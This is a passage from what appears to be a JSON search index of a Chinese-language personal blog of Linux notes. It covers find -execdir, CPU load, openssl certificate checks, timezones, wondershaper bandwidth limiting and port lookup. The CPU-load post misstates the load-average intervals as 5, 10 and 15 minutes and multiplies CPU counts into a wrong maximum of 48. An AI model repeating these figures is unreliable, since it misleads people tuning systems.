命令的用法及原理_一次次尝试-CSDN博客</a></li>\n<li><a href=\"https://github.com/ikysil/run-parts/blob/master/run-parts\" target=\"_blank\" rel=\"noopener\">run-parts/run-parts at master · ikysil/run-parts</a></li>\n<li><a href=\"http://phorum.study-area.org/index.php?topic=16017.0\" target=\"_blank\" rel=\"noopener\">請問 “run-parts” 這指令</a><br>這邊有提到順序<blockquote>\n<p>以 file name 字母順序來排：<br>ls /path/to/dir | sort</p>\n</blockquote>\n</li>\n<li><a href=\"https://ostechnix.com/fix-exec-format-error-when-running-scripts-with-run-parts-command/\" target=\"_blank\" rel=\"noopener\">Fix “Exec format error” When Running Scripts With run-parts Command</a><blockquote>\n<p>#!/usr/bin/python3<br>We can use:<br>#!/usr/bin/env python3</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"find\"><a href=\"#find\" class=\"headerlink\" title=\"find\"></a>find</h2><p>這個可能適合用在我的需求</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find /home/pi/shell/ -maxdepth 1 -<span class=\"built_in\">type</span> f -executable -name <span class=\"string\">'*.sh'</span> -<span class=\"built_in\">exec</span> &#123;&#125; \\;</span><br></pre></td></tr></table></figure>\n<p>改寫</p>\n<p> -executable 需要拿掉，這個是抓可執行的檔案</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -maxdepth 2 -<span class=\"built_in\">type</span> f -executable -name <span class=\"string\">'composer.json'</span> -<span class=\"built_in\">exec</span> composer update  \\;</span><br></pre></td></tr></table></figure>\n<p>卻不能跑</p>\n<p>後面改成 -exec pwd \\;<br>發現路徑是第一層路徑</p>\n<h3 id=\"使用-execdir\"><a href=\"#使用-execdir\" class=\"headerlink\" title=\"使用 execdir\"></a>使用 execdir</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -maxdepth 2 -<span class=\"built_in\">type</span> f  -name <span class=\"string\">'composer.json'</span> -execdir  composer update  \\;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/Qidi_Huang/article/details/53388589\" target=\"_blank\" rel=\"noopener\">应该在find命令中使用-execdir代替-exec_一程山水一程歌-CSDN博客</a></p>\n","categories":["Linux"],"tags":["linux","shell"]},{"title":"Linux 怎麼看 CPU 不夠用","url":"/blog/2020/09/24/Linux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8/","content":"<p>最近看到<a href=\"http://ypk1226.com/2019/04/17/java/cpu-usage/\" target=\"_blank\" rel=\"noopener\">認識CPU | 沉迷思考的魚</a><br>就好奇怎麼看CPU不夠力<br>最後來整理一下</p>\n<a id=\"more\"></a>\n<p>相關 CPU文章</p>\n<ol>\n<li><a href=\"http://ypk1226.com/2019/04/17/java/cpu-usage/\" target=\"_blank\" rel=\"noopener\">認識CPU | 沉迷思考的魚</a></li>\n<li><a href=\"https://www.ruanyifeng.com/blog/2011/07/linux_load_average_explained.html\" target=\"_blank\" rel=\"noopener\">理解Linux系統負荷 - 阮一峰的網絡日誌</a></li>\n<li><a href=\"https://www.cnblogs.com/rexcheny/p/9382396.html\" target=\"_blank\" rel=\"noopener\">CPU的load和使用率傻傻分不清 - 昀溪 - 博客園</a></li>\n</ol>\n<h2 id=\"查詢-CPU-核心和線程\"><a href=\"#查詢-CPU-核心和線程\" class=\"headerlink\" title=\"查詢 CPU 核心和線程\"></a>查詢 CPU 核心和線程</h2><p>Linux<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看 cpu 型號</span></span><br><span class=\"line\">sudo dmidecode -s processor-version</span><br><span class=\"line\"><span class=\"comment\"># 查看 cpu 個數</span></span><br><span class=\"line\">grep <span class=\"string\">'physical id'</span> /proc/cpuinfo | sort -u | wc -l</span><br><span class=\"line\"><span class=\"comment\"># 查看核心數</span></span><br><span class=\"line\">grep <span class=\"string\">'core id'</span> /proc/cpuinfo | sort -u | wc -l</span><br><span class=\"line\"><span class=\"comment\"># 查看線程數</span></span><br><span class=\"line\">grep <span class=\"string\">'processor'</span> /proc/cpuinfo | sort -u | wc -l</span><br></pre></td></tr></table></figure></p>\n<p>Mac<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看核心數</span></span><br><span class=\"line\">sysctl hw.physicalcpu</span><br><span class=\"line\"><span class=\"comment\"># 查看線程數</span></span><br><span class=\"line\">sysctl hw.logicalcpu</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"系統負荷怎麼看\"><a href=\"#系統負荷怎麼看\" class=\"headerlink\" title=\"系統負荷怎麼看\"></a>系統負荷怎麼看</h2><p>系統負荷簡單就能看 CPU 能不能夠用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">top</span><br><span class=\"line\">uptime</span><br></pre></td></tr></table></figure>\n<p>都可以看到 <code>load average: 0.09, 0.04, 0.00</code><br>這邊注意有三個數字，相當 5分鐘, 10 分鐘 ,15 分鐘系統負載<br>我們通常注意最後一個數字(15分鐘的)<br>怎樣數字能判斷?</p>\n<blockquote>\n<p>系統負荷的經驗法則</p>\n<p>1.0是系統負荷的理想值嗎？<br>不一定，系統管理員往往會留一點餘地，當這個值達到0.7，就應當引起注意了。經驗法則是這樣的：<br>當系統負荷持續大於0.7，你必須開始調查了，問題出在哪裡，防止情況惡化。<br>當系統負荷持續大於1.0，你必須動手尋找解決辦法，把這個值降下來。<br>當系統負荷達到5.0，就表明你的系統有很嚴重的問題，長時間沒有響應，或者接近死機了。你不應該讓系統達到這個值。<br>參考: <a href=\"http://ypk1226.com/2019/04/17/java/cpu-usage/\" target=\"_blank\" rel=\"noopener\">認識CPU | 沉迷思考的魚</a></p>\n</blockquote>\n<p>這邊要注意，這邊 1 全部是單指單核心、單一進程<br>下面會講一下多線程</p>\n<h2 id=\"多核心怎麼看系統負荷夠用\"><a href=\"#多核心怎麼看系統負荷夠用\" class=\"headerlink\" title=\"多核心怎麼看系統負荷夠用?\"></a>多核心怎麼看系統負荷夠用?</h2><blockquote>\n<p>總核數 = 物理CPU個數 <em> 每個物理CPU的核心數<br>總邏輯CPU數 = 物理CPU個數 </em> 每個物理CPU的核心數 * 超線程數量<br>參考<a href=\"https://www.cnblogs.com/rexcheny/p/9382396.html\" target=\"_blank\" rel=\"noopener\">CPU的load和使用率傻傻分不清 - 昀溪 - 博客園</a></p>\n</blockquote>\n<p>簡單來看把最上面三個指令執行一下相乘後，就可以看到系統負載最大值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查看 cpu 個數</span><br><span class=\"line\">grep &apos;physical id&apos; /proc/cpuinfo | sort -u | wc -l</span><br><span class=\"line\">2</span><br><span class=\"line\"># 查看核心數</span><br><span class=\"line\">grep &apos;core id&apos; /proc/cpuinfo | sort -u | wc -l</span><br><span class=\"line\">4</span><br><span class=\"line\"># 查看線程數</span><br><span class=\"line\">grep &apos;processor&apos; /proc/cpuinfo | sort -u | wc -l</span><br><span class=\"line\">6</span><br></pre></td></tr></table></figure>\n<p>這邊相乘就是 48</p>\n<p>PS: 所以在多核心 Linux 下的 CPU 使用率超過 100% 是正常的</p>\n<h2 id=\"實際觀察\"><a href=\"#實際觀察\" class=\"headerlink\" title=\"實際觀察\"></a>實際觀察</h2><p>我目前某一個排程主機 Jenkins 上板會把所有排程打開，這樣會有一個嚴重問題，當下記憶體、CPU 過重<br>需要人工去開啟未成功排程<br>最近看了這篇文章<br>top 指令當下是</p>\n<img src=\"/blog/2020/09/24/Linux-怎麼看-CPU-不夠用/img1.jpg\" title=\"系統負載\">\n<p>這邊也有看到文章說 5分鐘系統負載持續飆高 後面 10,15 分鐘的系統將會持續飆高<br>所以系統負載會不會好轉，可以從這邊看出來</p>\n<p>然後在系統負載小於 48 時候，我在 2x 開啟排程都能順利執行</p>\n<h2 id=\"番外篇-記憶體怎麼看\"><a href=\"#番外篇-記憶體怎麼看\" class=\"headerlink\" title=\"番外篇 記憶體怎麼看\"></a>番外篇 記憶體怎麼看</h2><p>之前我在玩樹梅派開很久會發現我 RAM 怎麼沒有降下去<br>後來看鳥哥文章看到 Linux RAM 不會馬上釋放掉<br>之後有看到文章說 swap 吃太多的時候，就要考慮到是不是記憶體不足?<br>有想到再補</p>\n<p><a href=\"https://medium.com/hungys-blog/clear-linux-memory-cache-manually-90bec95ea003\" target=\"_blank\" rel=\"noopener\">手動清除 Linux 記憶體快取. /proc/sys/vm/drop_caches | by Yu-Hsin Hung | Hungys.blog() | Medium</a><br><a href=\"https://blog.pichuang.com.tw/20200307-performance-collection/\" target=\"_blank\" rel=\"noopener\">尋找當下 Linux OS 效能瓶頸 - Phil Workspace</a></p>\n","categories":["Linux"],"tags":["linux","cpu"]},{"title":"Linux 指令搜尋多個檔案內容","url":"/blog/2019/09/23/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/","content":"<p>最近需要做搜尋多個檔案<br>但又不想把每一個檔案都抓下來<br>有網路找幾個方法，做個筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"Linux-指令方法\"><a href=\"#Linux-指令方法\" class=\"headerlink\" title=\"Linux 指令方法\"></a>Linux 指令方法</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find <span class=\"string\">\"path name\"</span> -name <span class=\"string\">\"file name\"</span> -<span class=\"built_in\">exec</span> grep -H <span class=\"string\">\"search content\"</span> &#123;&#125; \\;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://blog.pulipuli.info/2017/03/linuxfindgrep-search-content-of-files.html\" target=\"_blank\" rel=\"noopener\">Linux搜尋資料夾下的檔案內文：find+grep指令產生器 / Search the Content of Files on Linux: find + grep Command Builder - 布丁布丁吃什麼？</a><br><a href=\"http://falldog7.blogspot.com/2008/01/linux.html\" target=\"_blank\" rel=\"noopener\">Falldog的程式戰場: [Linux] 搜尋資料夾底下 檔案內部文字</a></p>\n<p>這個指令不是很快(不知道是不是真的資料太多啦XD)<br>主機指令不想安裝太複雜的程式<br>所以我就沒試了</p>\n<h2 id=\"其他工具\"><a href=\"#其他工具\" class=\"headerlink\" title=\"其他工具\"></a>其他工具</h2><p><a href=\"https://github.com/4ndrew/filesearcher\" target=\"_blank\" rel=\"noopener\">4ndrew/filesearcher: File Search experiments</a><br><a href=\"https://github.com/danielgatis/search_in_files\" target=\"_blank\" rel=\"noopener\">danielgatis/search_in_files: This is a tool for search text in files</a></p>\n<p>快速找檔案，但沒有找內容<br><a href=\"https://github.com/vishaltelangre/ff\" target=\"_blank\" rel=\"noopener\">vishaltelangre/ff: Find files (ff) by name, fast!</a><br>fzf 也能做到<br><a href=\"https://github.com/junegunn/fzf/issues/801\" target=\"_blank\" rel=\"noopener\">Make fzf installable by using <code>go get</code> · Issue #801 · junegunn/fzf</a></p>\n","categories":["實用工具"],"tags":["find","grep"]},{"title":"Linux 指令確認SSL憑證","url":"/blog/2020/05/30/Linux-%E6%8C%87%E4%BB%A4%E7%A2%BA%E8%AA%8DSSL%E6%86%91%E8%AD%89/","content":"<p>單純紀錄</p>\n<a id=\"more\"></a>\n<p>TODO: 有空回來整理</p>\n<p>Test FTP certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:21 -starttls ftp</span><br></pre></td></tr></table></figure></p>\n<p>Test POP3 certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:995</span><br></pre></td></tr></table></figure></p>\n<p>Test IMAP certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:993</span><br></pre></td></tr></table></figure></p>\n<p>Test SMTP SSL certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:465</span><br></pre></td></tr></table></figure></p>\n<p>Test SMTP TLS certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:587 -starttls smtp</span><br></pre></td></tr></table></figure></p>\n<p>Test HTTPS certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:443</span><br></pre></td></tr></table></figure></p>\n<p>Test DirectAdmin certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:2222</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p>How to verify SSL certificates with SNI (Server Name Indication) using OpenSSL</p>\n<p>Using SNI with OpenSSL is easy. Just add the -servername flag and you are good to go. Replace in the examples below mail.domain.com with the SNI name. Note: you can also use the SNI name to replace server.yourwebhoster.eu with.</p>\n<p>Test FTP certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:21 -starttls ftp -servername mail.domain.com</span><br></pre></td></tr></table></figure></p>\n<p>Test POP3 certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:995 -servername mail.domain.com</span><br></pre></td></tr></table></figure></p>\n<p>Test IMAP certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:993 -servername mail.domain.com</span><br></pre></td></tr></table></figure></p>\n<p>Test SMTP SSL certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:465 -servername mail.domain.com</span><br></pre></td></tr></table></figure></p>\n<p>Test SMTP TLS certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:587 -starttls smtp -servername mail.domain.com</span><br></pre></td></tr></table></figure></p>\n<p>Test HTTPS certificate<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client -connect server.yourwebhoster.eu:443 -servername mail.domain.com</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://www.qa-knowhow.com/?p=3888\" target=\"_blank\" rel=\"noopener\">SSL 相關的測試工具 – 軟體品管的專業思維</a></p>\n","categories":["Linux"]},{"title":"Linux 程式抓取Timezone流程","url":"/blog/2020/08/31/Linux-%E7%A8%8B%E5%BC%8F%E6%8A%93%E5%8F%96Timezone%E6%B5%81%E7%A8%8B/","content":"<p>簡單小記</p>\n<a id=\"more\"></a>\n<p>Linux 程式抓取Timezone流程</p>\n<p>​</p>\n<p><a href=\"https://blog.csdn.net/weixin_42167759/article/details/90648225\" target=\"_blank\" rel=\"noopener\">Linux —— 时间（tzselect、timedatactl命令，查看和修改时区，修改时区为东八区）_杰儿__er 的博客-CSDN博客</a></p>\n<p>​</p>\n<p>預設會抓Linux  TZ 環境變數，如果不存在，就會抓取/etc/localtime<br>注意這個不是單純txt，會用 linux link 方式去做連結的<br>所以可以ls - l /etc/localtime 看到指定的語系</p>\n<ol>\n<li>echo $TZ;</li>\n<li>ls -al /etc/localtime</li>\n</ol>\n<p>還可以用指令看 <code>datetimectl</code> 可以看目前使用語系</p>\n<p>就這麼簡單</p>\n<p>​</p>\n<p>​</p>\n<p>其他小記<br><a href=\"https://linuxhint.com/linux_date_command/\" target=\"_blank\" rel=\"noopener\">https://linuxhint.com/linux_date_command/</a><br><a href=\"https://www.jianshu.com/p/e0dd536dd3e4\" target=\"_blank\" rel=\"noopener\">HTTP日期/时间格式 - 簡書</a><br><a href=\"https://ckplus.github.io/2016/08/20/python-timezone/\" target=\"_blank\" rel=\"noopener\">Python 時間/時區處理 | CKPlus’s Blog</a></p>\n","categories":["Linux"],"tags":["linux","timezone"]},{"title":"Linux 查詢執行很久程式方法","url":"/blog/2020/06/09/Linux-%E6%9F%A5%E8%A9%A2%E5%9F%B7%E8%A1%8C%E5%BE%88%E4%B9%85%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/","content":"<p><a href=\"https://serverfault.com/questions/166034/kill-all-processes-that-are-running-for-more-than-5-minutes-by-a-given-user-in-l\" target=\"_blank\" rel=\"noopener\">Kill all processes that are running for more than 5 minutes by a given user in linux bash script - Server Fault</a></p>\n"},{"title":"Linux 限制網路速度方法","url":"/blog/2020/04/05/Linux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95/","content":"<p>最近發現動物機上傳速度高的話<br>容易造成別台機器網頁不能看(timeout)<br>原本想用中華電信小烏龜設定Qos<br>但好像沒有效果<br>網路上有看到 Linux 控制連線速度</p>\n<a id=\"more\"></a>\n<h2 id=\"wondershaper\"><a href=\"#wondershaper\" class=\"headerlink\" title=\"wondershaper\"></a>wondershaper</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 以下不能做，不要執行</span></span><br><span class=\"line\">sudo apt install wondershaper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 apt 安裝執行會出現</span></span><br><span class=\"line\"><span class=\"comment\"># Please read the man page for the wondershaper and</span></span><br><span class=\"line\"><span class=\"comment\"># the file /usr/share/doc/wondershaper/README.Debian.gz</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>…but as of Ubuntu 18.04LTS, the packaged wondershaper does not work correctly out of the box so you have to go direct to the github repo from magnific0</p>\n</blockquote>\n<p>好像…，apt 裝完不能用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/magnific0/wondershaper/archive/master.zip -c -O wondershaper-tmp.zip &amp;&amp; unzip -o wondershaper-tmp.zip &amp;&amp; rm wondershaper-tmp.zip &amp;&amp; <span class=\"built_in\">cd</span> wondershaper-master &amp;&amp; sudo make install ; <span class=\"built_in\">cd</span> .. &amp;&amp; rm -rf wondershaper-master</span><br></pre></td></tr></table></figure>\n<p>其實這些指令是抓檔案下來、解壓縮、刪除壓縮檔進去目錄，安裝程式完便刪除。</p>\n<p>參考:<a href=\"https://magiclen.org/linux-bandwidth-limit/\" target=\"_blank\" rel=\"noopener\">Linux 如何使用wondershaper來限制網路頻寬？ | MagicLen</a></p>\n<h3 id=\"如何移除\"><a href=\"#如何移除\" class=\"headerlink\" title=\"如何移除\"></a>如何移除</h3><p>因為使用 make install 安裝<br>所以不知道怎麼移除<br>到 wondershaper-master 做 <code>sudo make uninstall</code></p>\n<p><a href=\"https://askubuntu.com/questions/87111/if-i-build-a-package-from-source-how-can-i-uninstall-or-remove-completely\" target=\"_blank\" rel=\"noopener\">If I build a package from source how can I uninstall or remove completely? - Ask Ubuntu</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~/wondershaper-master $ sudo make uninstall</span><br><span class=\"line\">rm -f /usr/sbin/wondershaper;</span><br><span class=\"line\">rm -f /usr/lib/systemd/system/wondershaper.service;</span><br><span class=\"line\">rm -f /etc/conf.d/wondershaper.conf;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">MODES:</span><br><span class=\"line\">   wondershaper -a &lt;adapter&gt; -d &lt;rate&gt; -u &lt;rate&gt;</span><br><span class=\"line\">   wondershaper -c -a &lt;adapter&gt;</span><br><span class=\"line\">   wondershaper -s -a &lt;adapter&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">EXAMPLES:</span><br><span class=\"line\">   wondershaper -a eth0 -d 1024 -u 512</span><br><span class=\"line\">   wondershaper -a eth0 -u 512</span><br><span class=\"line\">   wondershaper -c -a eth0</span><br></pre></td></tr></table></figure>\n<p>記得輸入過的 wondershaper 的 interface 要重設速度<br>要做 <code>wondershaper -c -a &lt;interface&gt;</code></p>\n<h2 id=\"算傳輸速度\"><a href=\"#算傳輸速度\" class=\"headerlink\" title=\"算傳輸速度\"></a>算傳輸速度</h2><p><a href=\"https://www.convertunits.com/from/Kbps/to/megabyte/second\" target=\"_blank\" rel=\"noopener\">Convert Kbps to megabyte/second - Conversion of Measurement Units</a></p>\n<p>EX 限制 2mb 換算 Kbps 16000<br>公式:大概 1mb = 8000kbps<br>但我應該是記不住，靠電腦算就好了XD</p>\n<h3 id=\"設定服務\"><a href=\"#設定服務\" class=\"headerlink\" title=\"設定服務\"></a>設定服務</h3><p>重開機就會清除之前設定<br>他其實你打的指令也不會記錄<br>主要會吃/etc/systemd/wondershaper.conf<br>所以要改在這裏面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 啟用 service</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> wondershaper.service</span><br><span class=\"line\"><span class=\"comment\"># 停用 service</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">disable</span> wondershaper.service</span><br></pre></td></tr></table></figure>\n<p>奇怪，那我要設定多個 interface 要怎麼辦<br>我後來查都查不到<br>看到<a href=\"https://documentation.online.net/en/dedicated-server/tutorials/network/configure-wondershaper\" target=\"_blank\" rel=\"noopener\">Traffic management with WonderShaper [Documentation - Online.net]</a></p>\n<p>/usr/lib/systemd/system/wondershaper.service</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Bandwidth shaper/Network rate limiter</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\">Wants=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=oneshot</span><br><span class=\"line\">RemainAfterExit=yes</span><br><span class=\"line\">EnvironmentFile=/etc/systemd/wondershaper.conf</span><br><span class=\"line\">ExecStart=/usr/bin/wondershaper -a $IFACE -d $DSPEED -u $USPEED</span><br><span class=\"line\">ExecStop=/usr/bin/wondershaper -c -a $IFACE</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n<p>其實看 ExecStart ，只會幫你帶入一個<br>感覺能透過 EnvironmentFile 加參數<br>透過 ExecStart 和 ExecStop 實現多個 interface 操作</p>\n<p><a href=\"https://blog.wongcw.com/2019/05/07/linux%E6%9C%8D%E5%8B%99%E5%99%A8%E4%BD%BF%E7%94%A8wondershaper%E9%80%B2%E8%A1%8C%E7%B6%B2%E7%B5%A1%E9%80%9F%E5%BA%A6%E9%99%90%E5%88%B6/\" target=\"_blank\" rel=\"noopener\">linux服務器使用WonderShaper進行網絡速度限制 – WONGCW 網誌</a></p>\n<h2 id=\"Trickle\"><a href=\"#Trickle\" class=\"headerlink\" title=\"Trickle\"></a>Trickle</h2><p>Trickle 我就不研究了</p>\n<p><a href=\"https://ching119.pixnet.net/blog/post/59675947\" target=\"_blank\" rel=\"noopener\">【系統】Ubuntu : 限制網路頻寬 @ Ching Wei : This is My Life - 工作、攝影、旅遊 :: 痞客邦 ::</a><br><a href=\"https://kknews.cc/zh-tw/code/3494a8y.html\" target=\"_blank\" rel=\"noopener\">Linux下使用Trickle限制下載上傳帶寬 - 每日頭條</a><br><a href=\"https://magiclen.org/linux-bandwidth-limit/\" target=\"_blank\" rel=\"noopener\">Linux 如何使用wondershaper來限制網路頻寬？ | MagicLen</a></p>\n<h2 id=\"iptable-tc\"><a href=\"#iptable-tc\" class=\"headerlink\" title=\"iptable + tc\"></a>iptable + tc</h2><p>感覺 wondershaper 是用 tc<br>但我看不懂 tc 設定</p>\n<blockquote>\n<p>wondershaper 是一個易用的流量限制腳本. 該腳本提供了以下改進:<br>   降低交互流量時的延遲時間<br>   允許上傳/下載的同時保留適當的 Web 瀏覽速度<br>   確保上傳不會影響到下載<br>   確保下載不會影響到上傳</p>\n</blockquote>\n<p><a href=\"https://wiki.ubuntu.org.cn/Wondershaper%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7\" target=\"_blank\" rel=\"noopener\">Wondershaper流量監控工具 - Ubuntu中文</a></p>\n<p><a href=\"http://puremonkey2010.blogspot.com/2015/01/linux-tc-traffic-control.html\" target=\"_blank\" rel=\"noopener\">程式扎記: [Linux 文章收集] TC 入門 (traffic control)</a><br><a href=\"https://www.cnblogs.com/xingmuxin/p/10793272.html\" target=\"_blank\" rel=\"noopener\">使用iptables和tc对端口限速 - 行木辛 - 博客园</a><br><a href=\"https://segmentfault.com/a/1190000000666869\" target=\"_blank\" rel=\"noopener\">关于 iptables 和 tc 的限速理解 - 线上猛如虎，线下怂如鼠（WhyNotBetter） - SegmentFault 思否</a><br><a href=\"https://shofan.blogspot.com/2017/08/linux-tctraffic-control.html\" target=\"_blank\" rel=\"noopener\">[Linux] TC(traffic control)流量控制實作筆記(1)</a><br><a href=\"https://www.haxi.cc/archives/iptables-%E9%99%90%E9%80%9F.html\" target=\"_blank\" rel=\"noopener\">iptables 限速 - 哈希</a></p>\n<h2 id=\"其他工具\"><a href=\"#其他工具\" class=\"headerlink\" title=\"其他工具\"></a>其他工具</h2><p>爬到<a href=\"https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2017/08/10/linux-net-traffic-control.html#trickle\" target=\"_blank\" rel=\"noopener\">linux的traffic control@小鸟技术笔记</a>有很多工具</p>\n<p>dummynet</p>\n<blockquote>\n<p>dummynet通過創建pipe接管指定的報文，對其進行整型。</p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/baidu_zhongce/article/details/46874583\" target=\"_blank\" rel=\"noopener\">利用Dummynet模拟恶劣网络环境_运维_baidu_zhongce的博客-CSDN博客</a><br>其他惡劣環境方法:</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/jinjiangongzuoshi/p/5272787.html\" target=\"_blank\" rel=\"noopener\">模拟恶劣网络环境常用的几种解决方案 - 狂师 - 博客园</a></li>\n<li><a href=\"https://www.shangmayuan.com/a/0fd3247055c54298b214d92c.html\" target=\"_blank\" rel=\"noopener\">如何模拟弱网测试 - 尚码园</a></li>\n<li><a href=\"http://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html\" target=\"_blank\" rel=\"noopener\">Linux模拟复杂网络环境下的传输（netem和tc） - 哈希</a></li>\n</ul>\n<p>之前有在想要怎麼創造很糟網路環境，剛好看到這篇</p>\n<p>pyshaper</p>\n<blockquote>\n<p>pyshaper是一個帶有gui的限速工具。</p>\n</blockquote>\n","categories":["Linux"],"tags":["linux","限速"]},{"title":"[轉]Linux 查看程式用哪些 port 方法","url":"/blog/2020/09/28/Linux-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BC%8F%E7%94%A8%E5%93%AA%E4%BA%9B-port-%E6%96%B9%E6%B3%95/","content":"<p><a href=\"https://www.cnblogs.com/fps2tao/p/10042553.html\" target=\"_blank\" rel=\"noopener\">linux如何查看端口被哪个进程占用 - 与f - 博客园</a><br>最近看到這篇實用<br>筆記</p>\n<a id=\"more\"></a>\n<p>本文介紹linux如何查看端口被哪個進程佔用的方法：</p>\n<p>1、lsof -i:端口號</p>\n<p>2、netstat -tunlp|grep 端口號</p>\n<p>都可以查看指定端口被哪個進程佔用的情況</p>\n<p>【步驟一】lsof -i<br><img src=\"/blog/2020/09/28/Linux-查看程式用哪些-port-方法/img1.png\" title=\"title\"></p>\n<p>lsof -i 用以顯示符合條件的進程情況，lsof(list open files)是一個列出當前系統打開文件的工具。以root用戶來執行lsof -i命令，如下圖</p>\n<p>【步驟二】lsof -i:端口號</p>\n<img src=\"/blog/2020/09/28/Linux-查看程式用哪些-port-方法/img2.png\" title=\"title\">\n<p>lsof -i:端口號，用於查看某一端口的佔用情況，比如查看22號端口使用情況，lsof -i:22，如下圖</p>\n<p>【步驟三】netstat -tunlp</p>\n<p>netstat -tunlp用於顯示tcp，udp的端口和進程等相關情況，如下圖</p>\n<img src=\"/blog/2020/09/28/Linux-查看程式用哪些-port-方法/img3.png\" title=\"title\">\n<p>【步驟四】netstat -tunlp|grep 端口號</p>\n<img src=\"/blog/2020/09/28/Linux-查看程式用哪些-port-方法/img4.png\" title=\"title\">\n<p>netstat -tunlp|grep 端口號，用於查看指定端口號的進程情況，如查看22端口的情況，netstat -tunlp|grep 22，如下圖</p>\n<p>轉: <a href=\"https://jingyan.baidu.com/article/546ae1853947b71149f28cb7.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/546ae1853947b71149f28cb7.html</a></p>\n","categories":["Linux"],"tags":["linux"]},{"title":"Linux使用pppoe連線方法小記","url":"/blog/2019/01/26/Linux%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/","content":"<p>最近在好奇 pppoe 到底能不能走 wifi<br>google 一下發現<a href=\"https://www.ptt.cc/bbs/NextTV/M.1338039177.A.D3D.html\" target=\"_blank\" rel=\"noopener\">[問題] 走 Wi-Fi 可以搭配 PPPoE 嗎? - 看板 NextTV - 批踢踢實業坊</a><br>這篇有人說可以也有人說不行…<br>其中一段<code>cassine:PPPoE顧名思義就是PPP over 